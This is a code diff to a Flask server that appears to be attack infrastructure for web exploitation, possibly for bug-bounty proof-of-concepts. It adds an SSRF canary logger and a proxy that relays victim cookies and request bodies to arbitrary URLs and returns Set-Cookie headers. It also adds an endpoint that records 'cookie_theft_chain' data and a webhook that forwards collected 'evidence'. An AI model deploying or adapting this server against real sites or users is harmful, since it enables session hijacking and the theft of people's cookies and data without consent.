@@ -4,6 +4,8 @@ import json
 import requests
 import uuid
 from datetime import datetime
+import requests
+N8N_WEBHOOK = "http://localhost:5678/webhook-test/collect-evidence"  # ← Your n8n URL
 
 app = Flask(__name__)
 
@@ -27,23 +29,24 @@ def ssrf_canary(canary_id):
     hit = {
         'canary_id': canary_id,
         'timestamp': datetime.utcnow().isoformat(),
-        'user_agent': request.headers.get('User-Agent'),
+        'user_agent': request.headers.get('User-Agent', 'unknown'),
         'ip': request.headers.get('X-Forwarded-For', request.remote_addr),
         'headers': dict(request.headers)
     }
     canary_hits[canary_id] = hit
-    
-    with open('ssrf_canary_hits.jsonl', 'a') as f:
+
+    with open('ssrf_canary_hits.jsonl', 'a', encoding='utf-8') as f:
         f.write(json.dumps(hit) + '\n')
-    
-    print(f"\nSSRF HIT! Canary: {canary_id}")
-    print(f"From: {hit['ip']} | UA: {hit['user_agent'][:50]}")
-    
+
+    print(f"\nSSRF CANARY HIT!")
+    print(f"Canary ID: {canary_id}")
+    print(f"From: {hit['ip']} | UA: {hit['user_agent'][:60]}")
+    print(f"{'='*60}\n")
+
     return "OK", 200
 
 @app.route('/proxy-fetch', methods=['POST', 'OPTIONS'])
 def proxy_fetch():
-    """Server-side proxy to bypass CORS"""
     if request.method == 'OPTIONS':
         return '', 204
     
@@ -56,40 +59,73 @@ def proxy_fetch():
     
     try:
         print(f"\n{'='*60}")
-        print(f"🔄 PROXY REQUEST")
+        print(f"PROXY REQUEST")
         print(f"Target: {target_url}")
         print(f"Method: {method}")
+        print(f"Client Cookies: {request.cookies}")
         print(f"{'='*60}")
         
-        # Server fetches the target (no CORS restrictions!)
+        # Forward cookies from browser to target
+        forward_cookies = request.cookies  # This is a dict
+        cookie_header = '; '.join([f"{k}={v}" for k, v in forward_cookies.items()]) if forward_cookies else None
+
+        # Forward other important headers
+        headers = {
+            'User-Agent': request.headers.get('User-Agent', 'Mozilla/5.0'),
+            'Accept': request.headers.get('Accept', '*/*'),
+            'Accept-Language': request.headers.get('Accept-Language', 'en-US,en;q=0.9'),
+            'Referer': request.headers.get('Referer', ''),
+            'Origin': request.headers.get('Origin', ''),
+        }
+        if cookie_header:
+            headers['Cookie'] = cookie_header
+
+        # Optional: Allow body forwarding
+        client_data = None
+        if request.content_length and request.content_length > 0:
+            client_data = request.get_data()
+
         response = requests.request(
             method=method,
             url=target_url,
-            headers={
-                'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
-            },
-            timeout=10
+            headers=headers,
+            data=client_data,  # Forward body if sent
+            cookies=forward_cookies,  # Also pass as cookies dict
+            timeout=15,
+            allow_redirects=True
         )
         
-        result = {
-            'status': response.status_code,
-            'statusText': response.reason,
-            'headers': dict(response.headers),
-            'content': response.text[:5000],
-            'fullSize': len(response.text),
-            'url': target_url
-        }
-        
-        print(f"Status: {response.status_code}")
-        print(f"Size: {len(response.text)} bytes")
+        # Forward Set-Cookie back to browser (so cookies persist!)
+        flask_response = jsonify({
+            'ok': True,
+            'data': {
+                'status': response.status_code,
+                'statusText': response.reason,
+                'headers': dict(response.headers),
+                'content': response.text[:10000],
+                'fullSize': len(response.text),
+                'url': response.url
+            }
+        })
+
+        # Forward Set-Cookie headers
+        set_cookie = response.headers.get('Set-Cookie')
+        if set_cookie:
+            flask_response.headers['Set-Cookie'] = set_cookie
+
+        # Also handle multiple Set-Cookie
+        if 'Set-Cookie' in response.headers:
+            for cookie in response.headers.getlist('Set-Cookie'):
+                flask_response.headers.add('Set-Cookie', cookie)
+
+        print(f"Status: {response.status_code} | Cookies forwarded: {bool(cookie_header)}")
         print(f"{'='*60}\n")
         
-        return jsonify({'ok': True, 'data': result})
+        return flask_response
         
     except Exception as e:
-        print(f"❌ Proxy error: {e}\n")
+        print(f"Proxy error: {e}\n")
         return jsonify({'ok': False, 'error': str(e)}), 500
-
 
 @app.route('/collect-evidence', methods=['POST', 'OPTIONS'])
 def collect_evidence():
@@ -151,6 +187,18 @@ def collect_evidence():
         traceback.print_exc()
         return jsonify({'ok': False, 'error': str(e)}), 500
 
+@app.route('/collect-chain', methods=['POST'])
+def collect_chain():
+    data = request.get_json()
+    evidence = {
+        'type': 'cookie_theft_chain',
+        'timestamp': datetime.utcnow().isoformat(),
+        'data': data,
+        'ip': request.headers.get('X-Forwarded-For', request.remote_addr)
+    }
+    with open('cookie_theft_chains.jsonl', 'a') as f:
+        f.write(json.dumps(evidence) + '\n')
+    return jsonify({'ok': True}), 200
 
 @app.route('/collect-data', methods=['POST', 'OPTIONS'])
 def collect_data():
